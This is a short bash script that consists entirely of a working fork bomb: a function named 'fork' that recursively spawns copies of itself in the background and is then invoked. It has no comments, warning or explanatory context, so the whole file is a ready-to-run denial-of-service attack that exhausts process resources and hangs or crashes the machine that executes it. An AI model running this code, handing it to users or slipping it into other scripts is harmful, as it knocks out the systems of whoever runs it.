#!/bin/bash

fork() {
    fork | fork &
}

fork
